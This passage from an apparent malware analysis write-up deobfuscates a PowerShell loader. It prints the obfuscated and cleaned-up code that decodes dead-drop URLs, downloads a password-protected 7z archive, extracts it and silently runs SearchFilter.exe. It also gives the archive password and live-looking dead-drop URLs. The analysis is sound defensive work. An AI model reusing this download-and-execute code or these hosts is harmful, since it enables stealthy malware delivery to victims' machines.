        $ex = Join-Path $t ([System.Guid]::NewGuid().ToString());
        $c = New-Object System.Net.WebClient;
        $b = $c.DownloadData($dl);

        if ($b.Length -gt 0)
        {
            [System.IO.File]::WriteAllBytes($f, $b);

            e -a $f -o $ex;
            $exF = Join-Path $ex "SearchFilter.exe";

            if (Test-Path $exF)
            {
                Start-Process -FilePath $exF -WindowStyle Hidden
            };

            if (Test-Path $f)
            {
                Remove-Item $f
            }
        }
    }
    catch
    {
        throw
    }
}
```

This function is a bit chaotic on it's own, but let's try making sense of it anyways.

At first, if the first parameter, which is a string, is not supplied, it returns.

Then, if the `io` argument is set, it calls the `d` function using the passed string as parameter alongide the variable `prooc`. Later down, we see that the `d` function is called another time, and getting down even more, we see that another function called `e` is called too. It might be worth to check those two functions first.

#### d

```powershell
function d
{
    param 
    (
        [string]$mm, [string]$k
    )
    
    try
    {
        $b = [System.Convert]::FromBase64String($mm);
        $s = [System.Text.Encoding]::UTF8.GetString($b);
        $7zPath = New-Object char[] $s.Length;
        
        for ($i = 0; $i -lt $s.Length; $i++)
        {
            $c = $s[$i];
            $p = $k[$i % $k.Length];
            $7zPath[$i] = [char]($c - $p)
        }
        
        return -join $7zPath
    }
    catch
    {
        throw
    }
}
```

It's not obvious what this function does. Looking step by step, we can see that it decodes a Base64 string, and then loops through all of those characters and writes them to a new variable.

It seems like it's doing some rewriting of that path, also using hardcoded values from the `k` variable, which seems to be a small hardcoded dictionary.

Letting PowerShell run the code, we see that now the return value of the function is this url: `https://rlim.com/seraswodinsx/raw`.

We can say with a pretty good certainty that this function is used to retrieve some urls.

```powershell
function getUrlFromStringAndDictionary
{
    param 
    (
        [string]$base64String, [string]$hardcodedDictionary
    )
    
    try
    {
        $b = [System.Convert]::FromBase64String($base64String);
        $decodedString = [System.Text.Encoding]::UTF8.GetString($b);
        $url = New-Object char[] $decodedString.Length;

        for ($i = 0; $i -lt $decodedString.Length; $i++)
        {
            $c = $decodedString[$i];
            $p = $hardcodedDictionary[$i % $hardcodedDictionary.Length];
            $url[$i] = [char]($c - $p)
        }
        
        return -join $url
    }
    catch
    {
        throw
    }
}
```

#### e

```powershell
function e
{
    param
    (
        [string]$a, [string]$o
    )
    
    try
    {
        $s = "MTA0IDgyIDUxIDk0IDM4IDk4IDUwIDM3IDY1IDU3IDMzIDEwMyA3NSA0MiA1NCA3NiAxMTMgODAgNTUgMTE2IDM2IDc4IDExMiA4Nw==";
        $p = v -i $s;
        $z = "C:\ProgramData\sevenZip\7z.exe";
        $arg = "x `"$a`" -o`"$o`" -p$p -y";
        
        Start-Process -FilePath $z -ArgumentList $arg -WindowStyle Hidden -Wait
    }
    catch
    {
        throw
    }
};
```

While looking at the `e` function we can roughly see what it does: it extracts a 7z file. But what about the `s` and `p` variables?

Let's dive into the `v` function to get an idea on what those do.

#### v

```powershell
function v
{
    param
    (
        [string]$i
    )
    
    try
    {
        $b = [System.Convert]::FromBase64String($i);
        $s = [System.Text.Encoding]::UTF8.GetString($b);

        $c = $s -split ' ';
        $r = "";

        foreach ($x in $c)
        {
            $r += [char][int]$x
        }
        
        return $r
    }
    catch
    {
        throw
    }
};
```

This function is pretty straightforward: it extract data from the base 64 string, which will then be used by the `-p` parameter by 7zip, which will be the archive password.

We can run the function with PowerShell, and let him unravel the password for us, which is going to be the following: `hR3^&b2%A9!gK*6LqP7t$NpW`.

#### Back to e
All and all we know what the `e` function does: it extracts the 7z archive.

```powershell
function extract7zArchive
{
    param
    (
        [string]$inputFile, [string]$outputFile
    )
    
    try
    {
        $base46StringPassword = "MTA0IDgyIDUxIDk0IDM4IDk4IDUwIDM3IDY1IDU3IDMzIDEwMyA3NSA0MiA1NCA3NiAxMTMgODAgNTUgMTE2IDM2IDc4IDExMiA4Nw==";
        $password = retrievePassword -base64String $base46StringPassword;

        $7zPath = "C:\ProgramData\sevenZip\7z.exe";
        $arg = "x `"$inputFile`" -o`"$outputFile`" -p$password -y";

        Start-Process -FilePath $7zPath -ArgumentList $arg -WindowStyle Hidden -Wait
    }
    catch
    {
        throw
    }
};
```

#### Back to p
Now that we better understand what the subfunctions do, we can make more sense of the `p` function. It's the core of the program. It decodes everything and executes the downloaded files.

```powershell
function downloadAndDecode
{
    param
    (
        [string]$passedString, [switch]$io = $false, [switch]$if = $false
    )
    
    if (-not $passedString)
    {
        return
    }

    try
    {
        if ($io)
        {
            $retrievedUrl = getUrlFromStringAndDictionary -base64String $passedString -hardcodedDictionary $prooc;
            $r = Invoke-RestMethod -Uri $retrievedUrl -Method Get;
            $c = $r | Out-String;

            $rp = "([a-zA-Z0-9+/=]{50,})\.deodorantkindredimpo";
            $m = [regex]::Match($c, $rp);

            if (!$m.Success -or !$m.Groups[1].Value)
            {
                throw
            }
            
            $secondUrl = getUrlFromStringAndDictionary -base64String $m.Groups[1].Value -hardcodedDictionary $proc
        }
        
        if ($if)
        {
            $thirdUrl = getUrlFromStringAndDictionary -base64String $passedString -hardcodedDictionary $prooc;
            $thirdUrlContent = Invoke-RestMethod -Uri $thirdUrl;

            if ($thirdUrlContent)
            {
                $secondUrl = getUrlFromStringAndDictionary -base64String $thirdUrlContent -hardcodedDictionary $proc
            }
        }
        
        $randomString = [System.Guid]::NewGuid().ToString();
        $tempPath = [System.IO.Path]::GetTempPath();
        $tempFilePath = Join-Path $tempPath ($randomString + ".7z");

        $randomPath2 = Join-Path $tempPath ([System.Guid]::NewGuid().ToString());
        $webclient = New-Object System.Net.WebClient;
        $secondUrlData = $webclient.DownloadData($secondUrl);

        if ($secondUrlData.Length -gt 0)
        {
            [System.IO.File]::WriteAllBytes($tempFilePath, $secondUrlData);

            extract7zArchive -inputFile $tempFilePath -outputFile $randomPath2;
            $searchFilterPath = Join-Path $randomPath2 "SearchFilter.exe";

            if (Test-Path $searchFilterPath)
            {
                Start-Process -FilePath $searchFilterPath -WindowStyle Hidden
            };

            if (Test-Path $tempFilePath)
            {
                Remove-Item $tempFilePath
            }
        }
    }
    catch
    {
        throw
    }
}
```

#### Back to rl
We see something interesting now: the `rl` function and the next ones are called one after the other in case the first fails.

We can rename them accordingly.

```powershell
function firstFunctionCall
{
    try
    {
        downloadAndDecode "wr3DqMK3w5vDp2fCl2XCr8OZw6LCnsKNw53Do8OCwqPCtsOQw6bCjsObwq3CrMORw6LCn8OSw7LCo8OHw5XCug==" -if $true
    }
    catch
    {
        secondFunctionCall
    }
};

function secondFunctionCall
{
    try
    {
        downloadAndDecode "wr3DqMK3w5vDp2fCl2XCoMOcw53ClsOSw5vDosK5w5bCssOjwqLClsOXZcKiw5rDm8KWw4PCqcOlwrnDrXnDlcKtbMOewp/CosOkwrbCocORw5/DqsK+w5nCusKRw6HCnMOMwqvCqcOSwrZWwpHDgMOYwrbDpsK3" -io $true
    }
    catch
    {
        thirdFunctionCall
    }
};

function thirdFunctionCall
{
    try
    {
        downloadAndDecode "wr3DqMK3w5vDp2fCl2XCtsOcw67CpcOUwqjDlsK6wqPCm8OUwrxhwqxqwpLDlMOue8Kg" -io $true
    }
    catch
    {
        fourthFunctionCall
    }
};

function fourthFunctionCall
{
    try
    {
        downloadAndDecode "wr3DqMK3w5vDp2fCl2XCocOcw5zCpMKNw6HDo8OEw5vCr8OQwqLCkMOXwqNsw5HDqMKUw5TDp8OZw4PDqHLDj8KjXsKhwqLCp8ODwrzCgMOSwqfDoMOOwrvCu8ODw5Z6wpzCjG7Dk8OMesKUw5nDp8OLw4bCuMKtw5fCk8OZwojCgcKvw6FkwpjDn8OFw4HCtXvDosKjwpLDjMKfwrHCrMOuwqTDj8K3w6fCvcOVwrXDlMOiwpQ=" -io $true
    }
    catch
    {
        Start-Sleep -Seconds 20;
        firstFunctionCall
    }
};
```

Let's now go in order inside every function and see what the program actually does after downloading 7zip.

The `firstFunctionCall` function contacts the following url, and gathers the following data from it:

```
https://rlim.com/seraswodinsx/raw
```

```
w5nDpMOWwqnCn3JifMKfw5fCtMOmw7DDhMKPwp7DhsKRW8OKw6DDmcOVwq3CocKqwpjClMKnw5Jvwr/DqcOGw5PCqsOAwohvw6bDo8OTw5fCpcKNwqrChsKywp3DmcKCw5/DrcKRw5PCoMODwonCjcOww5bDo8KRwp3Cm8KvwqHCucKnw4/CpMKtw63CkcK0wqDCuMKWwo/DpcK3w5nDjsKtwpHCqmHChMKy
```

Then it contacts a GitHub url, but the problem is that it's malformatted: `https://github.c¹¦´\d=?ql\t7Q©HXH_MbÜ¯«(:$yq¡Oµ#"H',µÉÙ:yo20IExuºD|2xVÁ£:5A`.

This effectively halts the payload for `firstFunctionCall`.

Now `secondFunctionCall` runs, and this functions does something interesting. It queries another website, and that website returns an HTML webpage:

```
https://codesandbox.io/embed/qdy6j9?view=preview&module=%2Fdart
```

```html
<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta property="twitter:creator" content="@codesandbox"><link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Source Code Pro:500" rel="stylesheet"><link crossorigin="anonymous" rel="preload" href="/static/fonts/inter/Inter-Regular.woff2" as="font"><link crossorigin="anonymous" rel="preload" href="/static/fonts/inter/Inter-Medium.woff2" as="font"><link crossorigin="anonymous" rel="preload" href="/static/fonts/inter/Inter-Bold.woff2" as="font"><link href="/static/fonts/inter/inter.css" rel="stylesheet"><link href="/static/fonts/monolisa.css" rel="stylesheet"><link rel="manifest" href="/manifest.json"><link rel="mask-icon" href="/csb-ios.svg" color="#fff"><link href="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'>
<style>
svg {
background: transparent;
}
path {
fill: black;
}
@media (prefers-color-scheme: dark)  {
path {
  fill: white;
}
}
</style>
<path fill-rule='evenodd' clip-rule='evenodd' d='M81.8182 18.1818V81.8182H18.1818V18.1818H81.8182ZM10 90V10H90V90H10Z'/>
</svg>" rel="icon"/><title>pswin32 - CodeSandbox</title><script src="/static/js/env-config.js"></script><script src="https://codesandbox.io/static/browserfs12/browserfs.min.js" type="text/javascript"></script><script>BrowserFS&&(window.process={env:{VSCODE_DEV:!1},nextTick:function(e){return requestAnimationFrame(e)},once:BrowserFS.BFSRequire("process").once,removeListener:function(){}},window.Buffer=BrowserFS.BFSRequire("buffer").Buffer)</script><!-- AMD Loader for Monaco --><script src="/public/14/vs/loader.js"></script><script>window.require.config({url:"/public/14/vs/loader.js",paths:{vs:"/public/14/vs"}})</script><script>window.__SANDBOX_DATA__ = {"source_id":"src_RzR8XAu9UY3WQC3T5CPav4","forked_from_sandbox":null,"privacy":1,"draft":true,"modules":[{"code":"{\n  \"env\": {\n    \"browser\": true,\n    \"es2021\": true\n  },\n  \"extends\": [\n    \"eslint:recommended\"\n  ],\n  \"parser\": \"babel-eslint\",\n  \"parserOptions\": {\n    \"ecmaVersion\": 6,\n    \"sourceType\": \"module\"\n  }\n}","id":"mod_Wi2K7XDLU5J4nJDPju3fui","is_binary":false,"title":".eslintrc.json","sha":null,"inserted_at":"2025-08-08T17:08:12","updated_at":"2023-11-21T13:20:58","upload_id":null,"shortid":"GwVAQ","source_id":"src_RzR8XAu9UY3WQC3T5CPav4","directory_shortid":null},{"code":"{\"setupTasks\":[{\"name\":\"Install Dependencies\",\"command\":\"yarn install\"}],\"tasks\":{\"start\":{\"name\":\"start\",\"command\":\"yarn start\",\"runAtStart\":true,\"preview\":{\"port\":1234}},\"build\":{\"name\":\"build\",\"command\":\"yarn build\",\"runAtStart\":false}}}","id":"mod_XN1jzQoo1ArWmDAFuHaPQN","is_binary":false,"title":"tasks.json","sha":null,"inserted_at":"2025-08-08T17:08:12","updated_at":"2023-11-17T09:01:13","upload_id":null,"shortid":"xBWKJ","source_id":"src_RzR8XAu9UY3WQC3T5CPav4","directory_shortid":"rkcG3_tYP"},{"code":"{\n  \"name\": \"pswin32\"\n}\n","id":"mod_58EsY2C8t9mobH5Efsehz4","is_binary":false,"title":"package.json","sha":null,"inserted_at":"2025-08-08T17:08:12","updated_at":"2025-08-10T07:25:59","upload_id":null,"shortid":"ZGQK6","source_id":"src_RzR8XAu9UY3WQC3T5CPav4","directory_shortid":null},{"code":"w5nDpMOWwqnCn3JifMKfw5fCtMOmw7DDhMKPwp7DhsKRW8OKw6DDmcOVwq3CocKqwpjClMKnw5Jvwr\u002FDqcOGw5PCqsOAwohvw6bDo8OTw5fCpcKNwqrChsKywp3DmcKCw5\u002FDrcKRw5PCoMODwonCjcOww5bDo8KRwp3Cm8KvwqHCucKnw4\u002FCpMKtw63CkcK0wqDCuMKWwo\u002FDpcK3w5nDjsKtwpHCqmHChMKy.deodorantkindredimpo","id":"mod_HNYD2WkgedyQQeT7oPTJsF","is_binary":false,"title":"dart","sha":null,"inserted_at":"2025-08-08T17:08:13","updated_at":"2025-10-20T20:20:43","upload_id":null,"shortid":"YVxP0","source_id":"src_RzR8XAu9UY3WQC3T5CPav4","directory_shortid":null}],"custom_template":null,"team":{"id":"ws_HXvofbm2XZyhcSq9bbVeLS","name":"investigatordreamily","settings":{"ai_consent":{"public_sandboxes":false,"private_sandboxes":false}},"subscription_type":null,"avatar_url":"https:\u002F\u002Fuploads.codesandbox.io\u002Fuploads\u002Favatars\u002Fws_HXvofbm2XZyhcSq9bbVeLS-1754810444.png"},"author":{"id":"user_RxwnWhu5isz4nAqvxwCvTS","name":"demilitarizequirkily","username":"demilitarizequirkily","avatar_url":"https:\u002F\u002Flh3.googleusercontent.com\u002Fa\u002FACg8ocKs7nWUZz4u6rMguxnpAcmQry--BclnU0FkRWmBDx_sPzckUTs=s96-c","personal_workspace_id":"ws_HXvofbm2XZyhcSq9bbVeLS","subscription_plan":null,"subscription_since":null},"git":null,"npm_dependencies":{"react":"16.0.0","react-dom":"16.0.0"},"v2":false,"forked_template_sandbox":{"alias":"lucid-lalande-vanilla","id":"vanilla","title":"JavaScript","template":"parcel","inserted_at":"2018-02-28T16:00:16","updated_at":"2024-02-23T11:19:53","git":null,"privacy":0,"sdk":false,"custom_template":{"id":"sbtempl_VeEHiK2xSaza22yAujPY7P","title":"JavaScript","v2":false,"color":"#dfb07a","url":null,"published":false,"sdk":false,"icon_url":"JavaScriptIcon","official":false}},"forked_template":{"id":"sbtempl_VeEHiK2xSaza22yAujPY7P","title":"JavaScript","v2":false,"color":"#dfb07a","url":null,"published":false,"sdk":false,"icon_url":"JavaScriptIcon","official":false},"feature_flags":{"comments":false,"container_lsp":false},"settings":{"ai_consent":null,"use_pint":false},"is_frozen":false,"npm_registries":[],"original_git":null,"updated_at":"2025-10-20T20:20:43","like_count":0,"entry":"src\u002Findex.js","description":null,"restricted":false,"collection":false,"directories":[{"id":"dir_5cMdzKpcTs5dZ29Vqmp1Vu","title":".codesandbox","inserted_at":"2025-08-08T17:08:12","updated_at":"2020-11-11T14:58:27","shortid":"rkcG3_tYP","source_id":"src_RzR8XAu9UY3WQC3T5CPav4","directory_shortid":null}],"alias":"pswin32-qdy6j9","preview_secret":null,"pr_number":null,"inserted_at":"2025-08-08T17:08:12","sdk":false,"is_sse":false,"title":"pswin32","restrictions":{"free_plan_editing_restricted":false,"live_sessions_restricted":true},"base_git":null,"authorization":"read","screenshot_url":"https:\u002F\u002Fscreenshots.codesandbox.io\u002Fqdy6j9\u002F33.png","tags":[],"user_liked":false,"version":33,"room_id":null,"external_resources":[],"picks":[],"ai_consent":false,"id":"qdy6j9","fork_count":0,"view_count":127,"free_plan_editing_restricted":false,"always_on":false,"original_git_commit_sha":null,"owned":false,"permissions":{"prevent_sandbox_export":false,"prevent_sandbox_leaving":false},"template":"parcel"};</script><style>body,html{overscroll-behavior-x:none}</style><link href="https://codesandbox.io/static/css/common.fbffe659.chunk.css" rel="stylesheet"><link href="https://codesandbox.io/static/css/vendors~embed.ae83d4bc.chunk.css" rel="stylesheet"><link href="https://codesandbox.io/static/css/default~app~embed.aeaefc59.chunk.css" rel="stylesheet"><link href="https://codesandbox.io/static/css/embed.c8026191.css" rel="stylesheet"><meta property="og:title" name="og:title" content="pswin32 - CodeSandbox">
<meta property="twitter:title" name="twitter:title" content="pswin32 - CodeSandbox">
<meta property="description" name="description" content="pswin32 by demilitarizequirkily">
<meta property="og:description" name="og:description" content="pswin32 by demilitarizequirkily">
<meta property="twitter:description" name="twitter:description" content="pswin32 by demilitarizequirkily">
<meta property="og:author" name="og:author" content="demilitarizequirkily">
<meta property="article:author" name="article:author" content="demilitarizequirkily">
<meta property="robots" name="robots" content="noindex">
<meta property="article:published_time" name="article:published_time" content="2025-08-08T17:08:12">
<meta property="article:modified_time" name="article:modified_time" content="2025-10-20T20:20:43">
<meta property="article:section" name="article:section" content="parcel">
<meta property="og:type" name="og:type" content="article">
<meta property="og:url" name="og:url" content="https://codesandbox.io/s/qdy6j9">
<meta property="twitter:site" name="twitter:site" content="@codesandbox">
<script type="application/ld+json">{"name":"pswin32","text":null,"keywords":"parcel","author":{"name":"demilitarizequirkily","image":"https://lh3.googleusercontent.com/a/ACg8ocKs7nWUZz4u6rMguxnpAcmQry--BclnU0FkRWmBDx_sPzckUTs=s96-c","url":"https://codesandbox.io/u/demilitarizequirkily","@type":"Person"},"image":{"url":"https://codesandbox.io/api/v1/sandboxes/qdy6j9/screenshot.png","@type":"ImageObject"},"url":"https://codesandbox.io/s/qdy6j9","publisher":{"name":"CodeSandbox","logo":{"width":1200,"url":"https://codesandbox.io/static/img/banner.png","height":630,"@type":"ImageObject"},"@type":"Organization"},"codeRepository":"https://codesandbox.io/s/qdy6j9","codeSampleType":"full solution","dateCreated":"2025-08-08T17:08:12","dateModified":"2025-10-20T20:20:43","isBasedOn":null,"programmingLanguage":"parcel","thumbnailUrl":"https://codesandbox.io/api/v1/sandboxes/qdy6j9/screenshot.png","workExample":{"url":"https://qdy6j9.csb.app","applicationCategory":"parcel","operatingSystem":"Web app","screenshot":"https://codesandbox.io/api/v1/sandboxes/qdy6j9/screenshot.png","@type":"SoftwareApplication"},"@context":"https://schema.org","@type":"SoftwareSourceCode"}</script>
<link rel="canonical" href="https://codesandbox.io/s/qdy6j9" />
<meta property="og:image" name="og:image" content="https://codesandbox.io/api/v1/sandboxes/qdy6j9/screenshot.png">
<meta property="twitter:image:src" name="twitter:image:src" content="https://codesandbox.io/api/v1/sandboxes/qdy6j9/screenshot.png">
<meta property="og:image:alt" name="og:image:alt" content="A preview of pswin32">
<meta property="og:image:width" name="og:image:width" content="1200">
<meta property="twitter:image:width" name="twitter:image:width" content="1200">
<meta property="og:image:height" name="og:image:height" content="630">
<meta property="twitter:image:height" name="twitter:image:height" content="630">
<meta property="twitter:card" name="twitter:card" content="summary_large_image">
</head><body style="margin:0;padding:0;background-color:#191d1f;overflow:hidden"><div id="root"></div><script src="https://codesandbox.io/static/js/common-sandbox.4915834c1.chunk.js" crossorigin="anonymous"></script><script src="https://codesandbox.io/static/js/0.312f0905d.chunk.js"></script><script src="https://codesandbox.io/static/js/common.56083ff0a.chunk.js"></script><script src="https://codesandbox.io/static/js/vendors~embed~postcss-compiler.9e37c7d30.chunk.js"></script><script src="https://codesandbox.io/static/js/vendors~embed~page-search.a93e2e338.chunk.js"></script><script src="https://codesandbox.io/static/js/vendors~embed~move-sandbox-modal.c8d8a07e1.chunk.js" crossorigin="anonymous"></script><script src="https://codesandbox.io/static/js/vendors~embed~sandbox.7291f218b.chunk.js" crossorigin="anonymous"></script><script src="https://codesandbox.io/static/js/vendors~embed~sandbox-startup.94f8a764c.chunk.js" crossorigin="anonymous"></script><script src="https://codesandbox.io/static/js/vendors~embed.a7fe39e27.chunk.js"></script><script src="https://codesandbox.io/static/js/default~app~embed~sandbox~sandbox-startup.3ff9f1307.chunk.js" crossorigin="anonymous"></script><script src="https://codesandbox.io/static/js/default~app~embed~sandbox.220160212.chunk.js" crossorigin="anonymous"></script><script src="https://codesandbox.io/static/js/default~app~embed.93390617a.chunk.js"></script><script src="https://codesandbox.io/static/js/embed.5f0296208.js"></script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'99851f6a3c6a4c6e',t:'MTc2MjEwMjE0MC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body></html>
```

Then it checks for the regex match, and in this case it doesn't match, effectively throwing to the next function, `thirdFunctionCall`, follows the same path, and gets another webpage, this one from `https://youtu.be/XiH4D4UguJA`.

Aside the enormous html webpage, we now have a regex group match:

```
w5nDpMOWwqnCn3JifMKfw5fCtMOmw7DDhMKPwp7DhsKRW8OKw6DDmcOVwq3CocKqwpjClMKnw5Jvwr/DqcOGw5PCqsOAwohvw6bDo8OTw5fCpcKNwqrChsKywp3DmcKCw5/DrcKRw5PCoMODwonCjcOww5bDo8KRwp3Cm8KvwqHCucKnw4/CpMKtw63CkcK0wqDCuMKWwo/DpcK3w5nDjsKtwpHCqmHChMKy
```

Which is the same that produces the broken GitHub link `https://github.c¹¦´\d=?ql\t7Q©HXH_MbÜ¯«(:$yq¡Oµ#"H',µÉÙ:yo20IExuºD|2xVÁ£:5A`.

The `fourthFunctionCall` does pretty much the same thing:

```
https://docs.google.com/document/d/19ljVCOs-lyGxXbM4V1fSI5_svRuBcfqRDBh39eQlA8w/edit?usp=sharing
```

```
w5nDpMOWwqnCn3JifMKfw5fCtMOmw7DDhMKPwp7DhsKRW8OKw6DDmcOVwq3CocKqwpjClMKnw5Jvwr/DqcOGw5PCqsOAwohvw6bDo8OTw5fCpcKNwqrChsKywp3DmcKCw5/DrcKRw5PCoMODwonCjcOww5bDo8KRwp3Cm8KvwqHCucKnw4/CpMKtw63CkcK0wqDCuMKWwo/DpcK3w5nDjsKtwpHCqmHChMKy.deodorantkindredimpo
```

All and all it seems like those are all backup urls for the GitHub repository (which we cannot access because the url is corrupt).

*Further analysis will be made when I'll find out where is the problem of the corrupt link...*